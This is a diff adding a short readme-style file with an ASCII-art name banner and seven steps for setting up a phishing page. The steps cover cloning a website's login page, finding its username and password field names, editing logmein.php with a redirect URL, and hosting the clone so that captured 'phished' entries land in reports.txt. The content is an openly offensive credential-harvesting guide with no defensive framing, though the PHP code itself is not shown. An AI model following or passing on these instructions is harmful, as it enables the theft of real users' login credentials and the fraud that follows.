@@ -1,0 +1,17 @@
+/*                                             (                                      
+                                             )\ )                    (    (         
+ (   (    (      )     (       )            (()/(       )       (    )\   )\        
+ )\  )\   )\    /((    )\   ( /(    (        /(_))     (       ))\  ((_) ((_)   (   
+((_)((_) ((_)  (_))\  ((_)  )(_))   )\ )    (_))_      )\  '  /((_)  _    _     )\  
+\ \ / /   (_)  _)((_)  (_) ((_)_   _(_/(     |   \   _((_))  (_))   | |  | |   ((_) 
+ \ V /    | |  \ V /   | | / _` | | ' \))    | |) | | '  \() / -_)  | |  | |  / _ \ 
+  \_/     |_|   \_/    |_| \__,_| |_||_|     |___/  |_|_|_|  \___|  |_|  |_|  \___/ 
+                                                                                    */
+																					
+#1 Clone a website login page using website copier tool
+#2 Use Firefox right click the login username field and click on inspect element 
+#3 notedown the name of the username field
+#4 Repeat the same procedure for password field
+#5 Do the changes in logmein.php
+#6 Add the url to be redirected in logmein.php
+#7 Host the website any phished entry would be visible in the reports.txt file in same directory
